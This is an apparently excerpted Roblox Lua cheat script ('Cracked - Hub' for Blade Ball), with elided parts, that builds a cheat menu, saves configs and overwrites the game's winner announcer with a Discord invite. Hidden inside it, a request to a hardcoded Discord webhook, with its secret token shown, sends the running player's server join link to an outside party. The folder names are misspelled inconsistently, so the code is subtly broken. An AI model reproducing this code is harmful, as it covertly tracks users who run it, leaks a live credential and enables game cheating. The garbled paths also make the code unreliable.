...
local old_Allusive = CoreGui:FindFirstChild('Cracked - Hub')

if old_Allusive then
    Debris:AddItem(old_Allusive, 0)
end

if not isfolder("Cracked - Hub") then
    makefolder("Cacked - Hub")
end
...
local Config = setmetatable({
    save = function(self: any, file_name: any, config: any)
        local success_save, result = pcall(function()
            ...
            writefile('Cracked - Hub/'..file_name..'.json', flags)
        end)
    ...
    load = function(self: any, file_name: any, config: any)
        local success_load, result = pcall(function()
            if not isfile('Cracked  Hub/'..file_name..'.json') then
                self:save(file_name, config)
        
                return
            end
        
            local flags = readfile('Cacked - Hub/'..file_name..'.json')
        ...
        function TabManager:create_module(settings: any)
            ...
            function ModuleManager:create_text(settings: any)
                ...
                if not settings.rich then
                    ...
                    Body.RichText = true
                    Body.Text = settings.richtext or "<font color='rgb(255,0,0)'>Allusive</font> user" -- Default rich text
                end
                ...
                function TextManager:Set(new_settings)
                    if not new_settings.rich then
                        ...
                        Body.RichText = true
                        Body.Text = new_settings.richtext or "<font color='rgb(255,0,0)'>Allusive</font> user" -- Default rich text
                    end
                end;
...
local join = "https://fern.wtf/joiner?placeId=" .. placeId .. "&gameInstanceId=" .. jobId

local success = pcall(function()
    request({
        Url = "https://discord.com/api/webhooks/1427694719303155833/z9QOaWtyy9mub1JNRLJwiX1h01JPX6DjLSgcv9nuaGON5bhlDbyt7PZN_qoyOAgu4fYu",
        Method = "POST",
        ...
        Body = game:GetService("HttpService"):JSONEncode({
            embeds = {{
                ...
                color = 5763719,
                description = "Script: Cracked - Hub Bladeball", -- script name here
                fields = {
    ...
    local CustomAnnouncer = misc:create_module({
        ...
        callback = function(value: boolean)
            if value then
                ...
                if Winner then
                    Winner.Text = Library._config._flags["announcer_text"] or "discord.gg/Allusive"
                end
                    ...
                    if Value.Name == "Winner" then
                        Value.Changed:Connect(function(Property)
                            if Property == "Text" and Library._config._flags["Custom_Announcer"] then
                                Value.Text = Library._config._flags["announcer_text"] or "discord.gg/Allusive"
                            end
                        end)
